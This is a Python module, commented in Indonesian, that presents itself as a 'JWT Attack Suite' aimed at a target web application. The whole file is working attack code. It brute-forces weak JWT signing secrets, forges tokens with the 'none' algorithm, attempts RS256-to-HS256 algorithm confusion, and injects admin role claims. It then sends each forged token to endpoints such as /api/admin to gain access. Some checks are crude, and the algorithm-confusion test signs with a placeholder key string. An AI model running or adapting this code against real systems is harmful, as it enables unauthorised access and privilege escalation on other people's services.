#!/usr/bin/env python3
"""
Module 3: JWT Attack Suite 
Dengan konfigurasi token internal (hardcoded) untuk kemudahan penggunaan pribadi
"""

import asyncio
import json
import base64
import time
import hmac
import hashlib
from typing import List, Dict, Optional
from datetime import datetime, timedelta
from core.http_client import HTTPClient
from core.logger import Logger

logger = Logger()

# ============ KONFIGURASI TOKEN (EDIT SESUAI KEBUTUHAN ANDA) ============
# TODO: Ganti dengan JWT token target Anda
JWT_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NSIsIm5hbWUiOiJ0ZXN0Iiwicm9sZSI6InVzZXIifQ.signature"
# =========================================================================

# Bisa juga pakai multiple tokens untuk di-test sekaligus
JWT_TOKENS = [
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NSIsIm5hbWUiOiJ0ZXN0Iiwicm9sZSI6InVzZXIifQ.signature",
    # Tambahkan token lain di sini
]

class JWTAttack:
    def __init__(self, target: str, threads: int = 30, timeout: int = 5):
        self.target = target.rstrip('/')
        self.threads = threads
        self.timeout = timeout
        self.findings: List[Dict] = []
        self.stats = {
            'tokens_tested': 0,
            'vulnerabilities_found': 0
        }
        
        # ============ ULTIMATE WEAK SECRETS DATABASE ============
        self.critical_secrets = [
            'secret', 'secretkey', 'jwtsecret', 'mysecret', 'supersecret',
            'password', '123456', 'admin', 'key', 'token', 'auth',
            'changeme', 'welcome', 'test', 'testing', 'demo',
            '1234567890', 'qwerty', 'abc123', 'admin123', 'root',
            'letmein', 'monkey', 'dragon', 'master', 'login'
        ]
        
        self.medium_secrets = [
            'secret123', 'myjwtsecret', 'jwt_secret', 'app_secret', 'api_secret',
            'development', 'staging', 'production', 'localhost', '127.0.0.1',
            'admin@123', 'password123', 'passw0rd', 'adminadmin', 'rootroot',
            'toor', 'backdoor', 'default', 'sample', 'example'
        ]
        
        self.advanced_secrets = [
            'secret_key', 'private_key', 'public_key', 'shared_secret',
            'hmac_secret', 'signing_key', 'verification_key',
            'client_secret', 'server_secret', 'webhook_secret'
        ]
        
        self.all_secrets = self.critical_secrets + self.medium_secrets + self.advanced_secrets
        
        # JWT endpoints untuk testing
        self.jwt_endpoints = [
            "/api/user", "/api/me", "/api/profile", "/api/auth/me",
            "/api/verify", "/api/validate", "/api/check",
            "/api/admin", "/api/dashboard", "/api/settings",
        ]
    
    def decode_jwt(self, token: str) -> Optional[Dict]:
        """Decode JWT tanpa verifikasi"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None
            
            header_padding = 4 - (len(parts[0]) % 4)
            header_decoded = base64.urlsafe_b64decode(parts[0] + '=' * header_padding)
            header = json.loads(header_decoded.decode('utf-8'))
            
            payload_padding = 4 - (len(parts[1]) % 4)
            payload_decoded = base64.urlsafe_b64decode(parts[1] + '=' * payload_padding)
            payload = json.loads(payload_decoded.decode('utf-8'))
            
            return {
                "header": header,
                "payload": payload,
                "signature": parts[2],
                "raw": {
                    "header_b64": parts[0],
                    "payload_b64": parts[1],
                    "signature_b64": parts[2]
                }
            }
        except Exception as e:
            logger.debug(f"JWT decode error: {e}")
            return None
    
    def encode_jwt(self, header: Dict, payload: Dict, secret: str = "secret", algorithm: str = "HS256") -> str:
        """Encode JWT dengan signature"""
        header_json = json.dumps(header, separators=(',', ':'))
        header_b64 = base64.urlsafe_b64encode(header_json.encode()).decode().rstrip('=')
        
        payload_json = json.dumps(payload, separators=(',', ':'))
        payload_b64 = base64.urlsafe_b64encode(payload_json.encode()).decode().rstrip('=')
        
        message = f"{header_b64}.{payload_b64}"
        
        if algorithm == "HS256":
            signature = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
        elif algorithm == "HS384":
            signature = hmac.new(secret.encode(), message.encode(), hashlib.sha384).digest()
        elif algorithm == "HS512":
            signature = hmac.new(secret.encode(), message.encode(), hashlib.sha512).digest()
        else:
            signature = b""
        
        sig_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
        
        return f"{header_b64}.{payload_b64}.{sig_b64}"
    
    def create_none_algorithm_token(self, header: Dict, payload: Dict) -> str:
        """Create JWT with 'none' algorithm"""
        modified_header = header.copy()
        modified_header["alg"] = "none"
        
        header_json = json.dumps(modified_header, separators=(',', ':'))
        header_b64 = base64.urlsafe_b64encode(header_json.encode()).decode().rstrip('=')
        
        payload_json = json.dumps(payload, separators=(',', ':'))
        payload_b64 = base64.urlsafe_b64encode(payload_json.encode()).decode().rstrip('=')
        
        return f"{header_b64}.{payload_b64}."
    
    async def test_weak_secret(self, endpoint: str, original_token: str, decoded: Dict) -> Optional[Dict]:
        """Test weak secrets"""
        for secret in self.all_secrets:
            self.stats['tokens_tested'] += 1
            
            fake_token = self.encode_jwt(
                decoded["header"],
                decoded["payload"],
                secret=secret,
                algorithm=decoded["header"].get("alg", "HS256")
            )
            
            async with HTTPClient(self.target, timeout=self.timeout) as client:
                response = await client.get(f"{endpoint}?token={fake_token}")
                
                if response and response.status == 200:
                    body = await response.text()
                    if "error" not in body.lower() and "invalid" not in body.lower():
                        self.stats['vulnerabilities_found'] += 1
                        return {
                            "vulnerable": True,
                            "layer": "WEAK_SECRET",
                            "confidence": 100,
                            "secret_found": secret,
                            "endpoint": endpoint
                        }
            
            await asyncio.sleep(0.02)
        return None
    
    async def test_none_algorithm(self, endpoint: str, decoded: Dict) -> Optional[Dict]:
        """Test 'none' algorithm vulnerability"""
        modified_payload = decoded["payload"].copy()
        modified_payload["admin"] = True
        modified_payload["role"] = "admin"
        modified_payload["exp"] = int((datetime.now() + timedelta(days=30)).timestamp())
        
        fake_token = self.create_none_algorithm_token(decoded["header"], modified_payload)
        
        async with HTTPClient(self.target, timeout=self.timeout) as client:
            response = await client.get(f"{endpoint}?token={fake_token}")
            
            if response and response.status == 200:
                self.stats['vulnerabilities_found'] += 1
                return {
                    "vulnerable": True,
                    "layer": "NONE_ALGORITHM",
                    "confidence": 100,
                    "endpoint": endpoint,
                    "details": "JWT with 'none' algorithm accepted"
                }
        return None
    
    async def test_algorithm_confusion(self, endpoint: str, original_token: str, decoded: Dict) -> Optional[Dict]:
        """Test RS256 to HS256 algorithm confusion"""
        if decoded["header"].get("alg") != "RS256":
            return None
        
        modified_header = decoded["header"].copy()
        modified_header["alg"] = "HS256"
        
        fake_token = self.encode_jwt(
            modified_header,
            decoded["payload"],
            secret="-----BEGIN PUBLIC KEY-----",
            algorithm="HS256"
        )
        
        async with HTTPClient(self.target, timeout=self.timeout) as client:
            response = await client.get(f"{endpoint}?token={fake_token}")
            
            if response and response.status == 200:
                self.stats['vulnerabilities_found'] += 1
                return {
                    "vulnerable": True,
                    "layer": "ALGORITHM_CONFUSION",
                    "confidence": 100,
                    "endpoint": endpoint,
                    "details": "RS256 token accepted as HS256"
                }
        return None
    
    async def test_privilege_escalation(self, endpoint: str, decoded: Dict) -> Optional[Dict]:
        """Test privilege escalation via payload modification"""
        escalation_fields = [
            ("role", "admin"),
            ("is_admin", True),
            ("admin", True),
            ("user_type", "administrator"),
            ("permission", "admin"),
            ("access_level", 99),
            ("group", "admin"),
            ("scope", "admin"),
            ("privilege", "admin")
        ]
        
        for field, value in escalation_fields:
            modified_payload = decoded["payload"].copy()
            modified_payload[field] = value
            
            fake_token = self.encode_jwt(
                decoded["header"],
                modified_payload,
                secret="secret",
                algorithm=decoded["header"].get("alg", "HS256")
            )
            
            async with HTTPClient(self.target, timeout=self.timeout) as client:
                response = await client.get(f"{endpoint}?token={fake_token}")
                
                if response and response.status == 200:
                    body = await response.text()
                    if any(word in body.lower() for word in ['admin', 'dashboard', 'settings']):
                        self.stats['vulnerabilities_found'] += 1
                        return {
                            "vulnerable": True,
                            "layer": "PRIVILEGE_ESCALATION",
                            "confidence": 95,
                            "endpoint": endpoint,
                            "field_modified": field,
                            "details": f"Privilege escalation via {field}={value}"
                        }
        return None
    
    async def scan_token(self, token: str, endpoints: List[str] = None) -> Dict:
        """Full JWT attack scan on token"""
        
        if endpoints is None:
            endpoints = self.jwt_endpoints
        
        decoded = self.decode_jwt(token)
        if not decoded:
            logger.error("Invalid JWT token format")
            return {
                "module": "jwt_attack",
                "target": self.target,
                "token_valid": False,
                "vulnerabilities_found": 0,
                "findings": []
            }
        
        logger.info(f"\n{'='*60}")
        logger.info(f"🚀 DRYBT JWT ATTACK SUITE")
        logger.info(f"{'='*60}")
        logger.info(f"🎯 Target: {self.target}")
        logger.info(f"🔑 Algorithm: {decoded['header'].get('alg', 'unknown')}")
        logger.info(f"📦 Claims: {list(decoded['payload'].keys())[:10]}")
        logger.info(f"{'='*60}\n")
        
        start_time = time.time()
        
        for endpoint in endpoints[:5]:
            logger.info(f"\n📡 Testing endpoint: {endpoint}")
            
            result = await self.test_weak_secret(endpoint, token, decoded)
            if result:
                self.findings.append(result)
                logger.finding("WEAK SECRET", f"Secret found: {result.get('secret_found')}")
            
            result = await self.test_none_algorithm(endpoint, decoded)
            if result:
                self.findings.append(result)
                logger.finding("NONE ALGORITHM", "JWT accepted with 'none' algorithm")
            
            result = await self.test_algorithm_confusion(endpoint, token, decoded)
            if result:
                self.findings.append(result)
                logger.finding("ALGORITHM CONFUSION", "RS256 token accepted as HS256")
            
            result = await self.test_privilege_escalation(endpoint, decoded)
            if result:
                self.findings.append(result)
                logger.finding("PRIVILEGE ESCALATION", f"Modified field: {result.get('field_modified')}")
            
            await asyncio.sleep(0.2)
        
        elapsed = time.time() - start_time
        
        critical_findings = [f for f in self.findings if f.get('confidence', 0) >= 95]
        
        print(f"\n{'='*60}")
        print(f"📊 JWT ATTACK SCAN SUMMARY")
        print(f"{'='*60}")
        print(f"⏱️  Time: {elapsed:.2f} seconds")
        print(f"🎯 Vulnerabilities found: {len(self.findings)}")
        
        if critical_findings:
            print(f"\n💎 CRITICAL VULNERABILITIES:")
            for f in critical_findings:
                print(f"   🔥 {f['layer']} | Confidence: {f['confidence']}%")
        
        print(f"\n{'='*60}")
        
        rating = "🏆 CRITICAL - System COMPROMISED!" if critical_findings else \
                 "⚠️ VULNERABLE" if self.findings else "✅ SECURE"
        
        print(f"📈 Result: {rating}")
        print(f"{'='*60}\n")
        
        return {
            "module": "jwt_attack",
            "target": self.target,
            "scan_time_seconds": round(elapsed, 2),
            "token_algorithm": decoded['header'].get('alg', 'unknown'),
            "vulnerabilities_found": len(self.findings),
            "critical_vulnerabilities": len(critical_findings),
            "security_rating": rating,
            "findings": self.findings
        }
    
    @staticmethod
    async def run(target: str, endpoints: List[str] = None) -> Dict:
        """
        Run JWT attack suite dengan token internal
        
        Args:
            target: Target URL
            endpoints: Custom endpoints (optional)
        """
        scanner = JWTAttack(target)
        
        # Gunakan token dari konfigurasi di atas
        token = JWT_TOKEN
        
        logger.info(f"Using configured JWT token: {token[:50]}...")
        
        return await scanner.scan_token(token, endpoints)